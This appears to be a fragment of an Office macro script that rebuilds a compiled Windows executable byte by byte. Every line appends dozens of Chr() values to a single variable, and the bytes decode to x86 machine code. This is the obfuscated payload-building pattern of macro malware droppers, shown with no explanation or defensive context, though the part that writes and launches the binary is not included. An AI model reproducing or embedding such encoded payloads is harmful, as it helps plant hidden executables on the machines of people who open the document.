gfoN=gfoN&Chr(64)&Chr(0)&Chr(232)&Chr(142)&Chr(12)&Chr(0)&Chr(0)&Chr(89)&Chr(139)&Chr(240)&Chr(137)&Chr(117)&Chr(220)&Chr(137)&Chr(125)&Chr(228)&Chr(137)&Chr(117)&Chr(224)&Chr(131)&Chr(238)&Chr(4)&Chr(137)&Chr(117)&Chr(220)&Chr(59)&Chr(247)&Chr(114)&Chr(87)&Chr(232)&Chr(106)&Chr(12)&Chr(0)&Chr(0)&Chr(57)&Chr(6)&Chr(116)&Chr(237)&Chr(59)&Chr(247)&Chr(114)&Chr(74)&Chr(255)&Chr(54)&Chr(232)&Chr(100)&Chr(12)&Chr(0)&Chr(0)&Chr(139)&Chr(248)&Chr(232)&Chr(84)&Chr(12)&Chr(0)&Chr(0)&Chr(137)&Chr(6)&Chr(255)&Chr(215)&Chr(255)&Chr(53)&Chr(232)&Chr(183)&Chr(64)&Chr(0)&Chr(232)&Chr(78)&Chr(12)&Chr(0)&Chr(0)&Chr(139)&Chr(248)&Chr(255)&Chr(53)&Chr(228)&Chr(183)&Chr(64)&Chr(0)&Chr(232)&Chr(65)&Chr(12)&Chr(0)&Chr(0)&Chr(131)&Chr(196)&Chr(12)&Chr(57)&Chr(125)&Chr(228)&Chr(117)&Chr(5)&Chr(57)&Chr(69)&Chr(224)&Chr(116)&Chr(14)&Chr(137)&Chr(125)&Chr(228)
gfoN=gfoN&Chr(137)&Chr(125)&Chr(216)&Chr(137)&Chr(69)&Chr(224)&Chr(139)&Chr(240)&Chr(137)&Chr(117)&Chr(220)&Chr(139)&Chr(125)&Chr(216)&Chr(235)&Chr(159)&Chr(104)&Chr(12)&Chr(129)&Chr(64)&Chr(0)&Chr(184)&Chr(8)&Chr(129)&Chr(64)&Chr(0)&Chr(232)&Chr(95)&Chr(254)&Chr(255)&Chr(255)&Chr(89)&Chr(104)&Chr(20)&Chr(129)&Chr(64)&Chr(0)&Chr(184)&Chr(16)&Chr(129)&Chr(64)&Chr(0)&Chr(232)&Chr(79)&Chr(254)&Chr(255)&Chr(255)&Chr(89)&Chr(199)&Chr(69)&Chr(252)&Chr(254)&Chr(255)&Chr(255)&Chr(255)&Chr(232)&Chr(31)&Chr(0)&Chr(0)&Chr(0)&Chr(131)&Chr(125)&Chr(16)&Chr(0)&Chr(117)&Chr(40)&Chr(137)&Chr(29)&Chr(156)&Chr(172)&Chr(64)&Chr(0)&Chr(106)&Chr(8)&Chr(232)&Chr(171)&Chr(20)&Chr(0)&Chr(0)&Chr(89)&Chr(255)&Chr(117)&Chr(8)&Chr(232)&Chr(252)&Chr(253)&Chr(255)&Chr(255)&Chr(51)&Chr(219)&Chr(67)&Chr(131)&Chr(125)&Chr(16)&Chr(0)&Chr(116)&Chr(8)&Chr(106)&Chr(8)&Chr(232)
gfoN=gfoN&Chr(146)&Chr(20)&Chr(0)&Chr(0)&Chr(89)&Chr(195)&Chr(232)&Chr(90)&Chr(17)&Chr(0)&Chr(0)&Chr(195)&Chr(139)&Chr(255)&Chr(85)&Chr(139)&Chr(236)&Chr(106)&Chr(0)&Chr(106)&Chr(0)&Chr(255)&Chr(117)&Chr(8)&Chr(232)&Chr(195)&Chr(254)&Chr(255)&Chr(255)&Chr(131)&Chr(196)&Chr(12)&Chr(93)&Chr(195)&Chr(139)&Chr(255)&Chr(85)&Chr(139)&Chr(236)&Chr(106)&Chr(0)&Chr(106)&Chr(1)&Chr(255)&Chr(117)&Chr(8)&Chr(232)&Chr(173)&Chr(254)&Chr(255)&Chr(255)&Chr(131)&Chr(196)&Chr(12)&Chr(93)&Chr(195)&Chr(106)&Chr(1)&Chr(106)&Chr(0)&Chr(106)&Chr(0)&Chr(232)&Chr(157)&Chr(254)&Chr(255)&Chr(255)&Chr(131)&Chr(196)&Chr(12)&Chr(195)&Chr(106)&Chr(1)&Chr(106)&Chr(1)&Chr(106)&Chr(0)&Chr(232)&Chr(142)&Chr(254)&Chr(255)&Chr(255)&Chr(131)&Chr(196)&Chr(12)&Chr(195)&Chr(139)&Chr(255)&Chr(86)&Chr(232)&Chr(102)&Chr(11)&Chr(0)&Chr(0)&Chr(139)&Chr(240)&Chr(86)&Chr(232)&Chr(62)&Chr(28)
gfoN=gfoN&Chr(0)&Chr(0)&Chr(86)&Chr(232)&Chr(201)&Chr(27)&Chr(0)&Chr(0)&Chr(86)&Chr(232)&Chr(49)&Chr(21)&Chr(0)&Chr(0)&Chr(86)&Chr(232)&Chr(174)&Chr(27)&Chr(0)&Chr(0)&Chr(86)&Chr(232)&Chr(153)&Chr(27)&Chr(0)&Chr(0)&Chr(86)&Chr(232)&Chr(129)&Chr(25)&Chr(0)&Chr(0)&Chr(86)&Chr(232)&Chr(254)&Chr(1)&Chr(0)&Chr(0)&Chr(86)&Chr(232)&Chr(83)&Chr(19)&Chr(0)&Chr(0)&Chr(104)&Chr(186)&Chr(20)&Chr(64)&Chr(0)&Chr(232)&Chr(184)&Chr(10)&Chr(0)&Chr(0)&Chr(131)&Chr(196)&Chr(36)&Chr(163)&Chr(4)&Chr(160)&Chr(64)&Chr(0)&Chr(94)&Chr(195)&Chr(233)&Chr(255)&Chr(85)&Chr(139)&Chr(236)&Chr(81)&Chr(81)&Chr(83)&Chr(139)&Chr(93)&Chr(8)&Chr(86)&Chr(87)&Chr(51)&Chr(246)&Chr(51)&Chr(255)&Chr(137)&Chr(125)&Chr(252)&Chr(59)&Chr(28)&Chr(253)&Chr(8)&Chr(160)&Chr(64)&Chr(0)&Chr(116)&Chr(9)&Chr(71)&Chr(137)&Chr(125)&Chr(252)&Chr(131)&Chr(255)&Chr(23)
gfoN=gfoN&Chr(114)&Chr(238)&Chr(131)&Chr(255)&Chr(23)&Chr(15)&Chr(131)&Chr(119)&Chr(1)&Chr(0)&Chr(0)&Chr(106)&Chr(3)&Chr(232)&Chr(145)&Chr(31)&Chr(0)&Chr(0)&Chr(89)&Chr(131)&Chr(248)&Chr(1)&Chr(15)&Chr(132)&Chr(52)&Chr(1)&Chr(0)&Chr(0)&Chr(106)&Chr(3)&Chr(232)&Chr(128)&Chr(31)&Chr(0)&Chr(0)&Chr(89)&Chr(133)&Chr(192)&Chr(117)&Chr(13)&Chr(131)&Chr(61)&Chr(0)&Chr(160)&Chr(64)&Chr(0)&Chr(1)&Chr(15)&Chr(132)&Chr(27)&Chr(1)&Chr(0)&Chr(0)&Chr(129)&Chr(251)&Chr(252)&Chr(0)&Chr(0)&Chr(0)&Chr(15)&Chr(132)&Chr(65)&Chr(1)&Chr(0)&Chr(0)&Chr(104)&Chr(232)&Chr(134)&Chr(64)&Chr(0)&Chr(187)&Chr(20)&Chr(3)&Chr(0)&Chr(0)&Chr(83)&Chr(191)&Chr(160)&Chr(172)&Chr(64)&Chr(0)&Chr(87)&Chr(232)&Chr(228)&Chr(30)&Chr(0)&Chr(0)&Chr(131)&Chr(196)&Chr(12)&Chr(133)&Chr(192)&Chr(116)&Chr(13)&Chr(86)&Chr(86)&Chr(86)&Chr(86)&Chr(86)&Chr(232)
gfoN=gfoN&Chr(130)&Chr(20)&Chr(0)&Chr(0)&Chr(131)&Chr(196)&Chr(20)&Chr(104)&Chr(4)&Chr(1)&Chr(0)&Chr(0)&Chr(190)&Chr(185)&Chr(172)&Chr(64)&Chr(0)&Chr(86)&Chr(106)&Chr(0)&Chr(198)&Chr(5)&Chr(189)&Chr(173)&Chr(64)&Chr(0)&Chr(0)&Chr(255)&Chr(21)&Chr(36)&Chr(128)&Chr(64)&Chr(0)&Chr(133)&Chr(192)&Chr(117)&Chr(38)&Chr(104)&Chr(208)&Chr(134)&Chr(64)&Chr(0)&Chr(104)&Chr(251)&Chr(2)&Chr(0)&Chr(0)&Chr(86)&Chr(232)&Chr(162)&Chr(30)&Chr(0)&Chr(0)&Chr(131)&Chr(196)&Chr(12)&Chr(133)&Chr(192)&Chr(116)&Chr(15)&Chr(51)&Chr(192)&Chr(80)&Chr(80)&Chr(80)&Chr(80)&Chr(80)&Chr(232)&Chr(62)&Chr(20)&Chr(0)&Chr(0)&Chr(131)&Chr(196)&Chr(20)&Chr(86)&Chr(232)&Chr(251)&Chr(29)&Chr(0)&Chr(0)&Chr(64)&Chr(89)&Chr(131)&Chr(248)&Chr(60)&Chr(118)&Chr(56)&Chr(86)&Chr(232)&Chr(238)&Chr(29)&Chr(0)&Chr(0)&Chr(131)&Chr(238)&Chr(59)&Chr(3)&Chr(198)&Chr(106)
gfoN=gfoN&Chr(3)&Chr(185)&Chr(180)&Chr(175)&Chr(64)&Chr(0)&Chr(104)&Chr(204)&Chr(134)&Chr(64)&Chr(0)&Chr(43)&Chr(200)&Chr(81)&Chr(80)&Chr(232)&Chr(20)&Chr(29)&Chr(0)&Chr(0)&Chr(131)&Chr(196)&Chr(20)&Chr(133)&Chr(192)&Chr(116)&Chr(17)&Chr(51)&Chr(246)&Chr(86)&Chr(86)&Chr(86)&Chr(86)&Chr(86)&Chr(232)&Chr(251)&Chr(19)&Chr(0)&Chr(0)&Chr(131)&Chr(196)&Chr(20)&Chr(235)&Chr(2)&Chr(51)&Chr(246)&Chr(104)&Chr(200)&Chr(134)&Chr(64)&Chr(0)&Chr(83)&Chr(87)&Chr(232)&Chr(122)&Chr(28)&Chr(0)&Chr(0)&Chr(131)&Chr(196)&Chr(12)&Chr(133)&Chr(192)&Chr(116)&Chr(13)&Chr(86)&Chr(86)&Chr(86)&Chr(86)&Chr(86)&Chr(232)&Chr(215)&Chr(19)&Chr(0)&Chr(0)&Chr(131)&Chr(196)&Chr(20)&Chr(139)&Chr(69)&Chr(252)&Chr(255)&Chr(52)&Chr(197)&Chr(12)&Chr(160)&Chr(64)&Chr(0)&Chr(83)&Chr(87)&Chr(232)&Chr(85)&Chr(28)&Chr(0)&Chr(0)&Chr(131)&Chr(196)&Chr(12)&Chr(133)&Chr(192)
gfoN=gfoN&Chr(116)&Chr(13)&Chr(86)&Chr(86)&Chr(86)&Chr(86)&Chr(86)&Chr(232)&Chr(178)&Chr(19)&Chr(0)&Chr(0)&Chr(131)&Chr(196)&Chr(20)&Chr(104)&Chr(16)&Chr(32)&Chr(1)&Chr(0)&Chr(104)&Chr(160)&Chr(134)&Chr(64)&Chr(0)&Chr(87)&Chr(232)&Chr(200)&Chr(26)&Chr(0)&Chr(0)&Chr(131)&Chr(196)&Chr(12)&Chr(235)&Chr(50)&Chr(106)&Chr(244)&Chr(255)&Chr(21)&Chr(32)&Chr(128)&Chr(64)&Chr(0)&Chr(139)&Chr(216)&Chr(59)&Chr(222)&Chr(116)&Chr(36)&Chr(131)&Chr(251)&Chr(255)&Chr(116)&Chr(31)&Chr(106)&Chr(0)&Chr(141)&Chr(69)&Chr(248)&Chr(80)&Chr(141)&Chr(52)&Chr(253)&Chr(12)&Chr(160)&Chr(64)&Chr(0)&Chr(255)&Chr(54)&Chr(232)&Chr(57)&Chr(29)&Chr(0)&Chr(0)&Chr(89)&Chr(80)&Chr(255)&Chr(54)&Chr(83)&Chr(255)&Chr(21)&Chr(28)&Chr(128)&Chr(64)&Chr(0)&Chr(95)&Chr(94)&Chr(91)&Chr(201)&Chr(195)&Chr(106)&Chr(3)&Chr(232)&Chr(21)&Chr(30)&Chr(0)&Chr(0)&Chr(89)&Chr(131)
gfoN=gfoN&Chr(248)&Chr(1)&Chr(116)&Chr(21)&Chr(106)&Chr(3)&Chr(232)&Chr(8)&Chr(30)&Chr(0)&Chr(0)&Chr(89)&Chr(133)&Chr(192)&Chr(117)&Chr(31)&Chr(131)&Chr(61)&Chr(0)&Chr(160)&Chr(64)&Chr(0)&Chr(1)&Chr(117)&Chr(22)&Chr(104)&Chr(252)&Chr(0)&Chr(0)&Chr(0)&Chr(232)&Chr(41)&Chr(254)&Chr(255)&Chr(255)&Chr(104)&Chr(255)&Chr(0)&Chr(0)&Chr(0)&Chr(232)&Chr(31)&Chr(254)&Chr(255)&Chr(255)&Chr(89)&Chr(89)&Chr(195)&Chr(195)&Chr(139)&Chr(255)&Chr(85)&Chr(139)&Chr(236)&Chr(81)&Chr(81)&Chr(86)&Chr(232)&Chr(10)&Chr(11)&Chr(0)&Chr(0)&Chr(139)&Chr(240)&Chr(133)&Chr(246)&Chr(15)&Chr(132)&Chr(70)&Chr(1)&Chr(0)&Chr(0)&Chr(139)&Chr(86)&Chr(92)&Chr(161)&Chr(204)&Chr(160)&Chr(64)&Chr(0)&Chr(87)&Chr(139)&Chr(125)&Chr(8)&Chr(139)&Chr(202)&Chr(83)&Chr(57)&Chr(57)&Chr(116)&Chr(14)&Chr(139)&Chr(216)&Chr(107)&Chr(219)&Chr(12)&Chr(131)&Chr(193)&Chr(12)&Chr(3)
gfoN=gfoN&Chr(218)&Chr(59)&Chr(203)&Chr(114)&Chr(238)&Chr(107)&Chr(192)&Chr(12)&Chr(3)&Chr(194)&Chr(59)&Chr(200)&Chr(115)&Chr(8)&Chr(57)&Chr(57)&Chr(117)&Chr(4)&Chr(139)&Chr(193)&Chr(235)&Chr(2)&Chr(51)&Chr(192)&Chr(133)&Chr(192)&Chr(116)&Chr(10)&Chr(139)&Chr(88)&Chr(8)&Chr(137)&Chr(93)&Chr(252)&Chr(133)&Chr(219)&Chr(117)&Chr(7)&Chr(51)&Chr(192)&Chr(233)&Chr(251)&Chr(0)&Chr(0)&Chr(0)&Chr(131)&Chr(251)&Chr(5)&Chr(117)&Chr(12)&Chr(131)&Chr(96)&Chr(8)&Chr(0)&Chr(51)&Chr(192)&Chr(64)&Chr(233)&Chr(234)&Chr(0)&Chr(0)&Chr(0)&Chr(131)&Chr(251)&Chr(1)&Chr(15)&Chr(132)&Chr(222)&Chr(0)&Chr(0)&Chr(0)&Chr(139)&Chr(78)&Chr(96)&Chr(137)&Chr(77)&Chr(248)&Chr(139)&Chr(77)&Chr(12)&Chr(137)&Chr(78)&Chr(96)&Chr(139)&Chr(72)&Chr(4)&Chr(131)&Chr(249)&Chr(8)&Chr(15)&Chr(133)&Chr(184)&Chr(0)&Chr(0)&Chr(0)&Chr(139)&Chr(13)&Chr(192)&Chr(160)&Chr(64)
gfoN=gfoN&Chr(0)&Chr(139)&Chr(61)&Chr(196)&Chr(160)&Chr(64)&Chr(0)&Chr(139)&Chr(209)&Chr(3)&Chr(249)&Chr(59)&Chr(215)&Chr(125)&Chr(36)&Chr(107)&Chr(201)&Chr(12)&Chr(139)&Chr(126)&Chr(92)&Chr(131)&Chr(100)&Chr(57)&Chr(8)&Chr(0)&Chr(139)&Chr(61)&Chr(192)&Chr(160)&Chr(64)&Chr(0)&Chr(139)&Chr(29)&Chr(196)&Chr(160)&Chr(64)&Chr(0)&Chr(66)&Chr(3)&Chr(223)&Chr(131)&Chr(193)&Chr(12)&Chr(59)&Chr(211)&Chr(124)&Chr(226)&Chr(139)&Chr(93)&Chr(252)&Chr(139)&Chr(0)&Chr(139)&Chr(126)&Chr(100)&Chr(61)&Chr(142)&Chr(0)&Chr(0)&Chr(192)&Chr(117)&Chr(9)&Chr(199)&Chr(70)&Chr(100)&Chr(131)&Chr(0)&Chr(0)&Chr(0)&Chr(235)&Chr(94)&Chr(61)&Chr(144)&Chr(0)&Chr(0)&Chr(192)&Chr(117)&Chr(9)&Chr(199)&Chr(70)&Chr(100)&Chr(129)&Chr(0)&Chr(0)&Chr(0)&Chr(235)&Chr(78)&Chr(61)&Chr(145)&Chr(0)&Chr(0)&Chr(192)&Chr(117)&Chr(9)&Chr(199)&Chr(70)&Chr(100)&Chr(132)&Chr(0)
gfoN=gfoN&Chr(0)&Chr(0)&Chr(235)&Chr(62)&Chr(61)&Chr(147)&Chr(0)&Chr(0)&Chr(192)&Chr(117)&Chr(9)&Chr(199)&Chr(70)&Chr(100)&Chr(133)&Chr(0)&Chr(0)&Chr(0)&Chr(235)&Chr(46)&Chr(61)&Chr(141)&Chr(0)&Chr(0)&Chr(192)&Chr(117)&Chr(9)&Chr(199)&Chr(70)&Chr(100)&Chr(130)&Chr(0)&Chr(0)&Chr(0)&Chr(235)&Chr(30)&Chr(61)&Chr(143)&Chr(0)&Chr(0)&Chr(192)&Chr(117)&Chr(9)&Chr(199)&Chr(70)&Chr(100)&Chr(134)&Chr(0)&Chr(0)&Chr(0)&Chr(235)&Chr(14)&Chr(61)&Chr(146)&Chr(0)&Chr(0)&Chr(192)&Chr(117)&Chr(7)&Chr(199)&Chr(70)&Chr(100)&Chr(138)&Chr(0)&Chr(0)&Chr(0)&Chr(255)&Chr(118)&Chr(100)&Chr(106)&Chr(8)&Chr(255)&Chr(211)&Chr(89)&Chr(137)&Chr(126)&Chr(100)&Chr(235)&Chr(7)&Chr(131)&Chr(96)&Chr(8)&Chr(0)&Chr(81)&Chr(255)&Chr(211)&Chr(139)&Chr(69)&Chr(248)&Chr(89)&Chr(137)&Chr(70)&Chr(96)&Chr(131)&Chr(200)&Chr(255)&Chr(91)&Chr(95)&Chr(94)&Chr(201)
gfoN=gfoN&Chr(195)&Chr(139)&Chr(255)&Chr(86)&Chr(87)&Chr(51)&Chr(255)&Chr(57)&Chr(61)&Chr(236)&Chr(183)&Chr(64)&Chr(0)&Chr(117)&Chr(5)&Chr(232)&Chr(113)&Chr(36)&Chr(0)&Chr(0)&Chr(139)&Chr(53)&Chr(248)&Chr(183)&Chr(64)&Chr(0)&Chr(133)&Chr(246)&Chr(117)&Chr(5)&Chr(190)&Chr(128)&Chr(135)&Chr(64)&Chr(0)&Chr(138)&Chr(6)&Chr(60)&Chr(32)&Chr(119)&Chr(8)&Chr(132)&Chr(192)&Chr(116)&Chr(46)&Chr(133)&Chr(255)&Chr(116)&Chr(36)&Chr(60)&Chr(34)&Chr(117)&Chr(9)&Chr(51)&Chr(201)&Chr(133)&Chr(255)&Chr(15)&Chr(148)&Chr(193)&Chr(139)&Chr(249)&Chr(15)&Chr(182)&Chr(192)&Chr(80)&Chr(232)&Chr(97)&Chr(29)&Chr(0)&Chr(0)&Chr(89)&Chr(133)&Chr(192)&Chr(116)&Chr(1)&Chr(70)&Chr(70)&Chr(235)&Chr(211)&Chr(60)&Chr(32)&Chr(119)&Chr(7)&Chr(70)&Chr(138)&Chr(6)&Chr(132)&Chr(192)&Chr(117)&Chr(245)&Chr(95)&Chr(139)&Chr(198)&Chr(94)&Chr(195)&Chr(131)&Chr(61)&Chr(236)&Chr(183)
gfoN=gfoN&Chr(64)&Chr(0)&Chr(0)&Chr(117)&Chr(5)&Chr(232)&Chr(23)&Chr(36)&Chr(0)&Chr(0)&Chr(86)&Chr(139)&Chr(53)&Chr(96)&Chr(172)&Chr(64)&Chr(0)&Chr(87)&Chr(51)&Chr(255)&Chr(133)&Chr(246)&Chr(117)&Chr(24)&Chr(131)&Chr(200)&Chr(255)&Chr(233)&Chr(160)&Chr(0)&Chr(0)&Chr(0)&Chr(60)&Chr(61)&Chr(116)&Chr(1)&Chr(71)&Chr(86)&Chr(232)&Chr(1)&Chr(27)&Chr(0)&Chr(0)&Chr(89)&Chr(141)&Chr(116)&Chr(6)&Chr(1)&Chr(138)&Chr(6)&Chr(132)&Chr(192)&Chr(117)&Chr(234)&Chr(106)&Chr(4)&Chr(71)&Chr(87)&Chr(232)&Chr(211)&Chr(36)&Chr(0)&Chr(0)&Chr(139)&Chr(248)&Chr(89)&Chr(89)&Chr(137)&Chr(61)&Chr(124)&Chr(172)&Chr(64)&Chr(0)&Chr(133)&Chr(255)&Chr(116)&Chr(203)&Chr(139)&Chr(53)&Chr(96)&Chr(172)&Chr(64)&Chr(0)&Chr(83)&Chr(235)&Chr(66)&Chr(86)&Chr(232)&Chr(208)&Chr(26)&Chr(0)&Chr(0)&Chr(139)&Chr(216)&Chr(67)&Chr(128)&Chr(62)&Chr(61)&Chr(89)&Chr(116)
gfoN=gfoN&Chr(49)&Chr(106)&Chr(1)&Chr(83)&Chr(232)&Chr(165)&Chr(36)&Chr(0)&Chr(0)&Chr(89)&Chr(89)&Chr(137)&Chr(7)&Chr(133)&Chr(192)&Chr(116)&Chr(78)&Chr(86)&Chr(83)&Chr(80)&Chr(232)&Chr(58)&Chr(27)&Chr(0)&Chr(0)&Chr(131)&Chr(196)&Chr(12)&Chr(133)&Chr(192)&Chr(116)&Chr(15)&Chr(51)&Chr(192)&Chr(80)&Chr(80)&Chr(80)&Chr(80)&Chr(80)&Chr(232)&Chr(214)&Chr(16)&Chr(0)&Chr(0)&Chr(131)&Chr(196)&Chr(20)&Chr(131)&Chr(199)&Chr(4)&Chr(3)&Chr(243)&Chr(128)&Chr(62)&Chr(0)&Chr(117)&Chr(185)&Chr(255)&Chr(53)&Chr(96)&Chr(172)&Chr(64)&Chr(0)&Chr(232)&Chr(151)&Chr(35)&Chr(0)&Chr(0)&Chr(131)&Chr(37)&Chr(96)&Chr(172)&Chr(64)&Chr(0)&Chr(0)&Chr(131)&Chr(39)&Chr(0)&Chr(199)&Chr(5)&Chr(224)&Chr(183)&Chr(64)&Chr(0)&Chr(1)&Chr(0)&Chr(0)&Chr(0)&Chr(51)&Chr(192)&Chr(89)&Chr(91)&Chr(95)&Chr(94)&Chr(195)&Chr(255)&Chr(53)&Chr(124)&Chr(172)&Chr(64)
gfoN=gfoN&Chr(0)&Chr(232)&Chr(113)&Chr(35)&Chr(0)&Chr(0)&Chr(131)&Chr(37)&Chr(124)&Chr(172)&Chr(64)&Chr(0)&Chr(0)&Chr(131)&Chr(200)&Chr(255)&Chr(235)&Chr(228)&Chr(139)&Chr(255)&Chr(85)&Chr(139)&Chr(236)&Chr(81)&Chr(139)&Chr(77)&Chr(16)&Chr(83)&Chr(51)&Chr(192)&Chr(86)&Chr(137)&Chr(7)&Chr(139)&Chr(242)&Chr(139)&Chr(85)&Chr(12)&Chr(199)&Chr(1)&Chr(1)&Chr(0)&Chr(0)&Chr(0)&Chr(57)&Chr(69)&Chr(8)&Chr(116)&Chr(9)&Chr(139)&Chr(93)&Chr(8)&Chr(131)&Chr(69)&Chr(8)&Chr(4)&Chr(137)&Chr(19)&Chr(137)&Chr(69)&Chr(252)&Chr(128)&Chr(62)&Chr(34)&Chr(117)&Chr(16)&Chr(51)&Chr(192)&Chr(57)&Chr(69)&Chr(252)&Chr(179)&Chr(34)&Chr(15)&Chr(148)&Chr(192)&Chr(70)&Chr(137)&Chr(69)&Chr(252)&Chr(235)&Chr(60)&Chr(255)&Chr(7)&Chr(133)&Chr(210)&Chr(116)&Chr(8)&Chr(138)&Chr(6)&Chr(136)&Chr(2)&Chr(66)&Chr(137)&Chr(85)&Chr(12)&Chr(138)&Chr(30)&Chr(15)&Chr(182)
gfoN=gfoN&Chr(195)&Chr(80)&Chr(70)&Chr(232)&Chr(16)&Chr(28)&Chr(0)&Chr(0)&Chr(89)&Chr(133)&Chr(192)&Chr(116)&Chr(19)&Chr(255)&Chr(7)&Chr(131)&Chr(125)&Chr(12)&Chr(0)&Chr(116)&Chr(10)&Chr(139)&Chr(77)&Chr(12)&Chr(138)&Chr(6)&Chr(255)&Chr(69)&Chr(12)&Chr(136)&Chr(1)&Chr(70)&Chr(139)&Chr(85)&Chr(12)&Chr(139)&Chr(77)&Chr(16)&Chr(132)&Chr(219)&Chr(116)&Chr(50)&Chr(131)&Chr(125)&Chr(252)&Chr(0)&Chr(117)&Chr(169)&Chr(128)&Chr(251)&Chr(32)&Chr(116)&Chr(5)&Chr(128)&Chr(251)&Chr(9)&Chr(117)&Chr(159)&Chr(133)&Chr(210)&Chr(116)&Chr(4)&Chr(198)&Chr(66)&Chr(255)&Chr(0)&Chr(131)&Chr(101)&Chr(252)&Chr(0)&Chr(128)&Chr(62)&Chr(0)&Chr(15)&Chr(132)&Chr(233)&Chr(0)&Chr(0)&Chr(0)&Chr(138)&Chr(6)&Chr(60)&Chr(32)&Chr(116)&Chr(4)&Chr(60)&Chr(9)&Chr(117)&Chr(6)&Chr(70)&Chr(235)&Chr(243)&Chr(78)&Chr(235)&Chr(227)&Chr(128)&Chr(62)&Chr(0)&Chr(15)&Chr(132)
gfoN=gfoN&Chr(208)&Chr(0)&Chr(0)&Chr(0)&Chr(131)&Chr(125)&Chr(8)&Chr(0)&Chr(116)&Chr(9)&Chr(139)&Chr(69)&Chr(8)&Chr(131)&Chr(69)&Chr(8)&Chr(4)&Chr(137)&Chr(16)&Chr(255)&Chr(1)&Chr(51)&Chr(219)&Chr(67)&Chr(51)&Chr(201)&Chr(235)&Chr(2)&Chr(70)&Chr(65)&Chr(128)&Chr(62)&Chr(92)&Chr(116)&Chr(249)&Chr(128)&Chr(62)&Chr(34)&Chr(117)&Chr(38)&Chr(246)&Chr(193)&Chr(1)&Chr(117)&Chr(31)&Chr(131)&Chr(125)&Chr(252)&Chr(0)&Chr(116)&Chr(12)&Chr(141)&Chr(70)&Chr(1)&Chr(128)&Chr(56)&Chr(34)&Chr(117)&Chr(4)&Chr(139)&Chr(240)&Chr(235)&Chr(13)&Chr(51)&Chr(192)&Chr(51)&Chr(219)&Chr(57)&Chr(69)&Chr(252)&Chr(15)&Chr(148)&Chr(192)&Chr(137)&Chr(69)&Chr(252)&Chr(209)&Chr(233)&Chr(133)&Chr(201)&Chr(116)&Chr(18)&Chr(73)&Chr(133)&Chr(210)&Chr(116)&Chr(4)&Chr(198)&Chr(2)&Chr(92)&Chr(66)&Chr(255)&Chr(7)&Chr(133)&Chr(201)&Chr(117)&Chr(241)&Chr(137)&Chr(85)&Chr(12)
gfoN=gfoN&Chr(138)&Chr(6)&Chr(132)&Chr(192)&Chr(116)&Chr(85)&Chr(131)&Chr(125)&Chr(252)&Chr(0)&Chr(117)&Chr(8)&Chr(60)&Chr(32)&Chr(116)&Chr(75)&Chr(60)&Chr(9)&Chr(116)&Chr(71)&Chr(133)&Chr(219)&Chr(116)&Chr(61)&Chr(15)&Chr(190)&Chr(192)&Chr(80)&Chr(133)&Chr(210)&Chr(116)&Chr(35)&Chr(232)&Chr(43)&Chr(27)&Chr(0)&Chr(0)&Chr(89)&Chr(133)&Chr(192)&Chr(116)&Chr(13)&Chr(138)&Chr(6)&Chr(139)&Chr(77)&Chr(12)&Chr(255)&Chr(69)&Chr(12)&Chr(136)&Chr(1)&Chr(70)&Chr(255)&Chr(7)&Chr(139)&Chr(77)&Chr(12)&Chr(138)&Chr(6)&Chr(255)&Chr(69)&Chr(12)&Chr(136)&Chr(1)&Chr(235)&Chr(13)&Chr(232)&Chr(8)&Chr(27)&Chr(0)&Chr(0)&Chr(89)&Chr(133)&Chr(192)&Chr(116)&Chr(3)&Chr(70)&Chr(255)&Chr(7)&Chr(255)&Chr(7)&Chr(139)&Chr(85)&Chr(12)&Chr(70)&Chr(233)&Chr(86)&Chr(255)&Chr(255)&Chr(255)&Chr(133)&Chr(210)&Chr(116)&Chr(7)&Chr(198)&Chr(2)&Chr(0)&Chr(66)&Chr(137)
gfoN=gfoN&Chr(85)&Chr(12)&Chr(255)&Chr(7)&Chr(139)&Chr(77)&Chr(16)&Chr(233)&Chr(14)&Chr(255)&Chr(255)&Chr(255)&Chr(139)&Chr(69)&Chr(8)&Chr(94)&Chr(91)&Chr(133)&Chr(192)&Chr(116)&Chr(3)&Chr(131)&Chr(32)&Chr(0)&Chr(255)&Chr(1)&Chr(201)&Chr(195)&Chr(139)&Chr(255)&Chr(85)&Chr(139)&Chr(236)&Chr(131)&Chr(236)&Chr(12)&Chr(83)&Chr(51)&Chr(219)&Chr(86)&Chr(87)&Chr(57)&Chr(29)&Chr(236)&Chr(183)&Chr(64)&Chr(0)&Chr(117)&Chr(5)&Chr(232)&Chr(147)&Chr(33)&Chr(0)&Chr(0)&Chr(104)&Chr(4)&Chr(1)&Chr(0)&Chr(208)&Chr(190)&Chr(184)&Chr(175)&Chr(64)&Chr(0)&Chr(86)&Chr(83)&Chr(136)&Chr(29)&Chr(188)&Chr(176)&Chr(64)&Chr(0)&Chr(255)&Chr(21)&Chr(36)&Chr(128)&Chr(64)&Chr(0)&Chr(161)&Chr(248)&Chr(183)&Chr(64)&Chr(0)&Chr(137)&Chr(53)&Chr(140)&Chr(172)&Chr(64)&Chr(0)&Chr(59)&Chr(195)&Chr(116)&Chr(7)&Chr(137)&Chr(69)&Chr(252)&Chr(56)&Chr(24)&Chr(117)&Chr(3)
gfoN=gfoN&Chr(137)&Chr(117)&Chr(252)&Chr(139)&Chr(85)&Chr(252)&Chr(141)&Chr(69)&Chr(248)&Chr(80)&Chr(83)&Chr(83)&Chr(141)&Chr(125)&Chr(244)&Chr(232)&Chr(10)&Chr(254)&Chr(255)&Chr(255)&Chr(139)&Chr(69)&Chr(248)&Chr(131)&Chr(196)&Chr(12)&Chr(61)&Chr(255)&Chr(255)&Chr(255)&Chr(63)&Chr(115)&Chr(74)&Chr(139)&Chr(77)&Chr(244)&Chr(131)&Chr(249)&Chr(255)&Chr(115)&Chr(66)&Chr(139)&Chr(248)&Chr(193)&Chr(231)&Chr(2)&Chr(141)&Chr(4)&Chr(15)&Chr(59)&Chr(193)&Chr(114)&Chr(54)&Chr(80)&Chr(232)&Chr(214)&Chr(33)&Chr(0)&Chr(0)&Chr(139)&Chr(240)&Chr(89)&Chr(59)&Chr(243)&Chr(116)&Chr(41)&Chr(139)&Chr(85)&Chr(252)&Chr(141)&Chr(69)&Chr(52)&Chr(80)&Chr(3)&Chr(254)&Chr(87)&Chr(86)&Chr(141)&Chr(125)&Chr(244)&Chr(232)&Chr(201)&Chr(253)&Chr(255)&Chr(255)&Chr(139)&Chr(69)&Chr(248)&Chr(131)&Chr(196)&Chr(12)&Chr(72)&Chr(163)&Chr(112)&Chr(172)&Chr(64)&Chr(0)&Chr(137)&Chr(17)&Chr(116)
